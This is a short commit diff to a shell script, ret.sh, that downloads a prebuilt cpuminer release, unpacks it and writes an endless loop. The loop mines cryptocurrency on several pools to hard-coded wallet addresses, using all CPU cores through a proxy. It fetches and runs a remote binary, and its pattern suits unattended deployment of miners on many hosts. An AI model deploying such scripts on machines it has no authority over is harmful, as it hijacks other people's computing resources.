8a121e1f5df14225896ec999bcea32c9ae4c8061
thepowert <96099226+thepowert@users.noreply.github.com>
2021-12-27 12:13:31 +0700

    Update ret.sh

--- ret.sh
+++ ret.sh
@@ -5,11 +5,8 @@ array[2]="0003"
 size=${#array[@]}
 index=$(($RANDOM % $size))
 worker=${array[$index]}
-git clone https://github.com/JayDDee/cpuminer-opt.git
-cd cpuminer-opt
-chmod +x build.sh
-./build.sh && echo '#!/bin/sh
+wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz && echo '#!/bin/sh
 while [ 1 ]; do
-./cpuminer -a yespower -o stratum+tcp://yespower.eu.mine.zpool.ca:6234 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5 -p c=VRSC -o stratum+tcp://murkapool.it:6253 -u CQ5axqsyHCmRvEraX88oa7obrPhHyqsNN7.bLuWex-$worker -p c=CPMK -o stratum+tcp://fpool.eu:6234 -u CQ5axqsyHCmRvEraX88oa7obrPhHyqsNN7.juNeD-$worker -p c=CPMK -t $(nproc --all) -x $proxy
+./cpuminer -a yespower -o stratum+tcp://yespower.eu.mine.zpool.ca:6234 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5 -p c=VRSC -o stratum+tcp://murkapool.it:6253 -u CQ5axqsyHCmRvEraX88oa7obrPhHyqsNN7.bLuWex-$worker -p c=CPMK -o stratum+tcp://fpool.eu:6234 -u CQ5axqsyHCmRvEraX88oa7obrPhHyqsNN7.juNeD-$worker -p c=CPMK -t $(nproc --all) --$proxy
 sleep 5
 done' > autominer.sh && chmod +x autominer.sh && ./autominer.sh
